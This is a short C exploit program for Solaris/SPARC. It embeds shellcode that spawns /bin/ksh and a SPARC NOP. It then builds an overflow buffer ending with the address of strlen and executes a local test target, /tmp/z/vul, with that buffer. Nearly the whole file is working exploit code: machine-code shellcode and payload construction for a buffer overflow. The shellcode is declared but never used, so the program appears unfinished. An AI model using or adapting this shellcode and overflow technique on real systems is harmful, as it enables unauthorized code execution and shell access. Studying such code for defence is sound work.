//#include 

/* lsd - Solaris shellcode 
 */
static char shell[]=         /* 10*4+8 bytes */

        "\x20\xbf\xff\xff"   /* bn,a  */
        "\x20\xbf\xff\xff"   /* bn,a  */
        "\x7f\xff\xff\xff"   /* call  */
        "\x90\x03\xe0\x20"   /* add %o7,32,%o0 */
        "\x92\x02\x20\x10"   /* add %o0,16,%o1 */
        "\xc0\x22\x20\x08"   /* st %g0,[%o0+8] */
        "\xd0\x22\x20\x10"   /* st %o0,[%o0+16] */
        "\xc0\x22\x20\x14"   /* st %g0,[%o0+20] */
        "\x82\x10\x20\x0b"   /* mov 0x0b,%g1 */
        "\x91\xd0\x20\x08"   /* ta 8 */
        "/bin/ksh" ;


#define BUFSIZE 336

/* SPARC NOP
 */
static char np[] = "\xac\x15\xa1\x6e";


unsigned long get_sp( void ) {
        __asm__("or %sp,%sp,%i0");
}


main( int argc, char *argv[] ) {
	int err;
	unsigned long addr;

        char buf[ BUFSIZE ],*ptr;
	strcpy(buf,"12345678901234567890abcdefghijkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkL");
	ptr = buf + strlen(buf);

	printf("[.] strlen is at %08x\n",strlen);

	addr = (void*)strlen;

	*ptr++ = (addr >> 24) & 0xff;
	*ptr++ = (addr >> 16) & 0xff;
	*ptr++ = (addr >>  8) & 0xff;
	*ptr++ = (addr >>  0) & 0xff;
        		
	*ptr++ = 0;

        err = execl( "/tmp/z/vul", "vul", buf, ( void *)0 );
        if( err == -1 ) perror("execl"); else puts("[*] executed OK");
}
